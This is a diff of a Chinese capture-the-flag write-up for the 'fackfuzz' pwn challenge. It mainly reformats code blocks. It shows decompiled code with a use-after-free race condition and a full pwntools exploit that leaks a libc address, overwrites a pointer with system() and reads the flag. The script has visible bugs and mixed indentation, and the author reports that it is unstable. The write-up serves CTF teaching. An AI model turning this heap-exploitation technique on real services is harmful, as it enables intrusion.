@@ -14,13 +14,13 @@ keywords: fackfuzz, Writeup, 武汉大学邀请赛
 运行一下可执行程序，可以看到此程序是一个驱动的fuzz程序
 
 ```
-	---->fack driver fuzzing<----
-	1. add a driver to fuzz
-	2. prepare fuzz data
-	3. start fuzzing
-	4. stop fuzzing
-	5. view driver list
-	6. exit
+---->fack driver fuzzing<----
+1. add a driver to fuzz
+2. prepare fuzz data
+3. start fuzzing
+4. stop fuzzing
+5. view driver list
+6. exit
 ```
 
 *	add a driver to fuzz 会分配一个形为
@@ -32,24 +32,25 @@ keywords: fackfuzz, Writeup, 武汉大学邀请赛
 
 程序的漏洞存在于函数**sub_401336**中
 
-	void __fastcall __noreturn freethread(void *a1)
-	{
-	  int idx; // [rsp+1Ch] [rbp-4h]@1
-	
-	  idx = *(_DWORD *)a1;
-	  currentidx = idx;
-	  isstop[idx] = 1;
-	  free(ptr[idx]);
-	  puts("wait for fuzz thread done");
-	  sleep(3u);
-	  ptr[idx] = 0LL;
-	  if ( threadnum < 0 )
-	    threadnum = 0;
-	  free(data[idx]);
-	  data[idx] = 0LL;
-	  puts("stop this fuzz done!");
-	  pthread_exit(0LL);
-	}
+```
+void __fastcall __noreturn freethread(void *a1)
+{
+  int idx; // [rsp+1Ch] [rbp-4h]@1
+  idx = *(_DWORD *)a1;
+  currentidx = idx;
+  isstop[idx] = 1;
+  free(ptr[idx]);
+  puts("wait for fuzz thread done");
+  sleep(3u);
+  ptr[idx] = 0LL;
+  if ( threadnum < 0 )
+    threadnum = 0;
+  free(data[idx]);
+  data[idx] = 0LL;
+  puts("stop this fuzz done!");
+  pthread_exit(0LL);
+}
+```
 
 此函数会在调用stop fuzzing的时候以pthread_create创建新进程的形式运行。由于free之后会有一个3秒的间隔。这个间隔原意是等待fuzz线程的结束，但是也导致了一个竞态条件的漏洞。
 
@@ -66,33 +67,33 @@ keywords: fackfuzz, Writeup, 武汉大学邀请赛
 以下函数为stop fuzzing的处理函数,该函数通过比对driver name获取一个idx，最终这个idx会作为函数**sub_401336**中的idx。
 
 ```
-	__int64 stopfuzz()
-	{
-	  signed int i; // [rsp+Ch] [rbp-74h]@3
-	  char s2; // [rsp+10h] [rbp-70h]@1
-	  __int64 v3; // [rsp+78h] [rbp-8h]@1
-	
-	  v3 = *MK_FP(__FS__, 40LL);
-	  puts("input the driver name to stop fuzzing:");
-	  readn((__int64)&s2, 0x68uLL);
-	  if ( (unsigned int)checkname(&s2) )
-	  {
-	    for ( i = 0; i <= 9; ++i )
-	    {
-	      if ( ptr[i] && !strcmp(ptr[i], &s2) )
-	      {
-	        stop(i);
-	        return *MK_FP(__FS__, 40LL) ^ v3;
-	      }
-	    }
-	    puts("error name");
-	  }
-	  else
-	  {
-	    puts("invalid name");
-	  }
-	  return *MK_FP(__FS__, 40LL) ^ v3;
-	}
+__int64 stopfuzz()
+{
+  signed int i; // [rsp+Ch] [rbp-74h]@3
+  char s2; // [rsp+10h] [rbp-70h]@1
+  __int64 v3; // [rsp+78h] [rbp-8h]@1
+
+  v3 = *MK_FP(__FS__, 40LL);
+  puts("input the driver name to stop fuzzing:");
+  readn((__int64)&s2, 0x68uLL);
+  if ( (unsigned int)checkname(&s2) )
+  {
+    for ( i = 0; i <= 9; ++i )
+    {
+      if ( ptr[i] && !strcmp(ptr[i], &s2) )
+      {
+        stop(i);
+        return *MK_FP(__FS__, 40LL) ^ v3;
+      }
+    }
+    puts("error name");
+  }
+  else
+  {
+    puts("invalid name");
+  }
+  return *MK_FP(__FS__, 40LL) ^ v3;
+}
 ```
 
 但是，如果我们如果按照以下顺序进行调用
@@ -118,97 +119,97 @@ keywords: fackfuzz, Writeup, 武汉大学邀请赛
 ## exploit代码
 
 ```
-	from pwn import *;
-	from time import sleep;
-	port=8888
-	objname = "fackfuzz"
-	objpath = "./"+objname
-	io = process(objpath)
+from pwn import *;
+from time import sleep;
+port=8888
+objname = "fackfuzz"
+objpath = "./"+objname
+io = process(objpath)
 	
-	def readuntil(delim):
-	    data = io.recvuntil(delim);
-	    print data;
-	    return data;
+def readuntil(delim):
+    data = io.recvuntil(delim);
+    print data;
+    return data;
 	
-	def readlen(len):
-	    data = io.recv(len,1);
-	    return data;
+def readlen(len):
+    data = io.recv(len,1);
+    return data;
 	
-	def readall():
-	    data = io.recv(4096,1);
-	    print data;
-	    return data;
+def readall():
+    data = io.recv(4096,1);
+    print data;
+    return data;
 	
-	def write(data):
-	    sleep(0.05)
-	    io.send(str(data));
+def write(data):
+    sleep(0.05)
+    io.send(str(data));
 	    
-	def writeline(data):
-	    sleep(0.05)
-	    io.sendline(str(data));
+def writeline(data):
+    sleep(0.05)
+    io.sendline(str(data));
 	
-	def padding(size):
-	    cf = "/bin/shcat/home/ctf/flag";
-	    paddata = "";
-	    for i in range(size):
-	        paddatax += cf[i%len(cf)];
-	    return paddata;
+def padding(size):
+    cf = "/bin/shcat/home/ctf/flag";
+    paddata = "";
+    for i in range(size):
+        paddatax += cf[i%len(cf)];
+    return paddata;
 	
-	def newdriver(name):
-	    writeline(1);
-	    writeline(name)
-	    readall()
-	def prepare(readsize,readdata):
-	    writeline(2);
-	    writeline(readsize);
-	    writeline(readdata);
-	    writeline(2);
-	    writeline(1);
-	    writeline(1);
-	    writeline(1);
-	    writeline(1);
-	    readall()
-	def startfuzz(name):
-	    writeline(3);
-	    writeline(name);
-	    readall();
-	def stopfuzz(name):
-	    writeline(4);
-	    writeline(name);
-	    readall();
-	def viewdriver():
-	    writeline(5);
-	    print readuntil(":");
-	    return readuntil("\n")[:-1];
-	    	
-	def attack(ip=0):
-	    global io
-	    if ip != 0:
-	        io = remote(ip,port)
-	    newdriver("/dev/haha1");
-	    prepare(10,"haha1")
-	    prepare(50,"cat flag > /dev/fd/1\x00")
-	    stopfuzz("/dev/haha1");
-	    usortbin=viewdriver();
-	    usortbin=usortbin+(8-len(usortbin))*'\x00';
-	    usortbin=u64(usortbin);
-	    system=usortbin-0x378178
-	    print hex(system);
-	    newdriver("/dev/haha3");0x01e36010
-	    stopfuzz("/dev/haha3");
-	    sleep(4)
-	    
-	    payload="/dev/haha4\x00"
-	    payload+=(0x68-len(payload))*"A";
-	    payload+=p64(system)*3;
-	    prepare(0x88,payload);
-	    print viewdriver()
-	    
-	    startfuzz("/dev/haha4");
-	    sleep(3)
-	    readall()＃get flag
+def newdriver(name):
+	 writeline(1);
+	 writeline(name)
+	 readall()
+def prepare(readsize,readdata):
+	 writeline(2);
+	 writeline(readsize);
+	 writeline(readdata);
+	 writeline(2);
+	 writeline(1);
+	 writeline(1);
+	 writeline(1);
+	 writeline(1);
+    readall()
+def startfuzz(name):
+    writeline(3);
+    writeline(name);
+    readall();
+def stopfuzz(name):
+    writeline(4);
+    writeline(name);
+    readall();
+def viewdriver():
+    writeline(5);
+    print readuntil(":");
+    return readuntil("\n")[:-1];
+    	
+def attack(ip=0):
+    global io
+    if ip != 0:
+        io = remote(ip,port)
+    newdriver("/dev/haha1");
+    prepare(10,"haha1")
+    prepare(50,"cat flag > /dev/fd/1\x00")
+    stopfuzz("/dev/haha1");
+    usortbin=viewdriver();
+    usortbin=usortbin+(8-len(usortbin))*'\x00';
+    usortbin=u64(usortbin);
+    system=usortbin-0x378178
+    print hex(system);
+    newdriver("/dev/haha3");0x01e36010
+    stopfuzz("/dev/haha3");
+    sleep(4)
+    
+    payload="/dev/haha4\x00"
+    payload+=(0x68-len(payload))*"A";
+    payload+=p64(system)*3;
+    prepare(0x88,payload);
+    print viewdriver()
+    
+    startfuzz("/dev/haha4");
+    sleep(3)
+    readall()＃get flag
 
-	attack()
+attack()
 ```
 
-**此exploit理论上应该完全没问题，但是实际攻击的时候却不是很稳定，我调试了很久也没有找到原因，还希望找到原因的同学联系我分享一下你的想法,感激不尽**
+**此exploit理论上应该没问题，但是实际攻击的时候却不是很稳定，有时候得不到flag，我调试了很久也没有找到原因，还希望找到原因的同学联系我分享一下你的想法,感激不尽**
